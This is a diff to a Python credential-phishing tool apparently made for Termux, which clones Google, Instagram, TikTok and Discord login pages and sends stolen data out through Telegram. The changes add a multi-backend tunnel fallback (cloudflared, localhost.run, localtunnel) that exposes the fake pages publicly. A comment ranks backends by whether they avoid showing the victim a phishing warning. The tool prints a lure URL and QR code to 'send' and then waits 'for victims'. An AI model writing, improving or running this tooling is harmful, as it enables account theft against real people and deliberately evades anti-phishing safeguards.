@@ -52,7 +52,7 @@ def banner():
     out = []
     for i, line in enumerate(BANNER_LINES):
         out.append(GRAD[i % len(GRAD)] + line + N)
-    out.append(f"{W}        v3.1 {D}— termux edition{N} {M}|{N} {C}localtunnel{N} {M}|{N} {C}tg exfil{N} {M}|{N} {C}live stats{N}")
+    out.append(f"{W}        v3.3 {D}— termux edition{N} {M}|{N} {C}multi-tunnel{N} {M}|{N} {C}tg exfil{N} {M}|{N} {C}live stats{N}")
     return "\n".join(out)
 
 SITES = ["google", "instagram", "tiktok", "discord"]
@@ -202,37 +202,51 @@ def assets(filename):
     return redirect("/")
 
 # ---------- tunneling ----------
-def lt_cmd(port):
-    """return the best available localtunnel command, or None.
-    prefers nyxtunnel.js (lib API) — the official lt binary crashes on
-    termux because its openurl dependency rejects the android platform."""
+# backends ranked by 2026 reliability research (tested live):
+#   cloudflared  — zero interstitial, serves pages raw. BEST.
+#   localhost.run— ssh-based, no binary needed, but free tier is flaky
+#   localtunnel  — shows phishing interstitial asking victim's IP. AVOID.
+TUNNEL_BACKENDS = ["cloudflared", "localhost.run", "localtunnel"]
+
+def tunnel_cmd(backend, port):
+    """build command for a backend, or None if not available"""
     import shutil
-    node = shutil.which("node") or "/data/data/com.termux/files/usr/bin/node"
-    cands = [
-        [node, os.path.join(BASE_DIR, "nyxtunnel.js")],
-        [os.path.join(BASE_DIR, "node_modules", ".bin", "lt")],
-        ["/data/data/com.termux/files/usr/bin/lt"],
-        [shutil.which("lt") or ""],
-        [shutil.which("npx") or "", "localtunnel"],
-    ]
-    for base in cands:
-        if base[0] and os.path.exists(base[0]):
-            if base[0].endswith("lt") or "npx" in base[0]:
-                return base + ["--port", str(port)]
-            return base + [str(port)]
+    if backend == "cloudflared":
+        local = os.path.join(BASE_DIR, "cloudflared")
+        bin_ = local if os.path.exists(local) else shutil.which("cloudflared")
+        if not bin_:
+            bin_ = "/data/data/com.termux/files/usr/bin/cloudflared"
+        if os.path.exists(bin_):
+            return [bin_, "tunnel", "--url", f"http://localhost:{port}",
+                    "--no-autoupdate"]
+    elif backend == "localhost.run":
+        ssh = shutil.which("ssh") or "/data/data/com.termux/files/usr/bin/ssh"
+        if os.path.exists(ssh):
+            return [ssh, "-R", f"80:localhost:{port}", "nokey@localhost.run",
+                    "-o", "StrictHostKeyChecking=no",
+                    "-o", "ServerAliveInterval=30",
+                    "-o", "BatchMode=yes"]
+    elif backend == "localtunnel":
+        node = shutil.which("node") or "/data/data/com.termux/files/usr/bin/node"
+        script = os.path.join(BASE_DIR, "nyxtunnel.js")
+        if os.path.exists(node) and os.path.exists(script):
+            return [node, script, str(port)]
     return None
 
-def start_tunnel(port):
-    cmd = lt_cmd(port)
-    if not cmd:
-        print(f"{R}[!] localtunnel not found on this device.")
-        print(f"    termux fix: {W}pkg install nodejs && npm install -g localtunnel{N}")
-        print(f"    or run:     {W}bash install.sh{N}")
-        sys.exit(1)
+URL_PATTERNS = [
+    r"https://[-a-z0-9]+\.trycloudflare\.com",
+    r"https://[-a-z0-9]+\.lhr\.life",
+    r"https://[a-z0-9-]+\.loca\.lt",
+]
 
+def spawn_tunnel(backend, port):
+    """try one backend, return url or None"""
+    cmd = tunnel_cmd(backend, port)
+    if not cmd:
+        return None, "not installed"
     done = threading.Event()
     t = threading.Thread(target=spinner,
-                         args=(f"establishing localtunnel on :{port}...", done),
+                         args=(f"trying {backend} on :{port}...", done),
                          daemon=True)
     t.start()
     try:
@@ -240,49 +254,59 @@ def start_tunnel(port):
                                 stderr=subprocess.STDOUT, text=True)
     except Exception as e:
         done.set(); t.join()
-        print(f"{R}[!] failed to spawn tunnel: {e}{N}")
-        sys.exit(1)
-
+        return None, str(e)
     url_found = None
-    raw_output = []
     start = time.time()
-    while time.time() - start < 60:
+    while time.time() - start < 45:
         line = proc.stdout.readline()
         if not line:
             if proc.poll() is not None:
-                break  # process died
+                break
             continue
-        raw_output.append(line.strip())
-        # localtunnel prints: "your url is: https://xyz.loca.lt"
-        m = re.search(r"https://[a-z0-9-]+\.loca\.lt", line)
-        if m:
-            url_found = m.group(0)
+        for pat in URL_PATTERNS:
+            m = re.search(pat, line)
+            if m:
+                url_found = m.group(0)
+                break
+        if url_found:
             break
     done.set(); t.join()
+    if not url_found:
+        proc.terminate()
+        return None, "timeout/no url"
+    return url_found, proc
 
-    if url_found:
-        STATE["tunnel_url"] = url_found
-        typewrite(f"{G}[+] tunnel established{N}", 0.015)
-        print(f"\n  {W}🎣 send this:{N}  {C}{W}{url_found}{N}")
-        try:
-            import qrcode
-            qr = qrcode.QRCode(border=1)
-            qr.add_data(url_found); qr.make()
-            print(f"\n{D}  scan to open:{N}")
-            qr.print_ascii(invert=True)
-        except ImportError:
-            pass
-        print(f"\n{Y}[*] waiting for victims... {D}(ctrl+c to stop){N}")
-    else:
-        print(f"{R}[!] tunnel failed after 60s.{N}")
-        if raw_output:
-            print(f"{D}    lt said:{N}")
-            for l in raw_output[:5]:
-                print(f"{D}      {l}{N}")
+def start_tunnel(port):
+    chosen = None
+    url = None
+    proc = None
+    for backend in TUNNEL_BACKENDS:
+        url, result = spawn_tunnel(backend, port)
+        if url:
+            chosen = backend
+            proc = result
+            break
         else:
-            print(f"{D}    lt produced no output — check node/npm install{N}")
-        print(f"    manual test: {W}lt --port {port}{N}")
+            print(f"{D}    {backend}: {result}{N}")
+    if not url:
+        print(f"{R}[!] all tunnel backends failed.{N}")
+        print(f"    termux fix: {W}pkg install cloudflared openssh{N}")
+        print(f"    or run:     {W}bash install.sh{N}")
         sys.exit(1)
+
+    STATE["tunnel_url"] = url
+    STATE["backend"] = chosen
+    typewrite(f"{G}[+] tunnel established via {chosen}{N}", 0.015)
+    print(f"\n  {W}🎣 send this:{N}  {C}{W}{url}{N}")
+    try:
+        import qrcode
+        qr = qrcode.QRCode(border=1)
+        qr.add_data(url); qr.make()
+        print(f"\n{D}  scan to open:{N}")
+        qr.print_ascii(invert=True)
+    except ImportError:
+        pass
+    print(f"\n{Y}[*] waiting for victims... {D}(ctrl+c to stop){N}")
 
 # ---------- helpers ----------
 def local_ip():
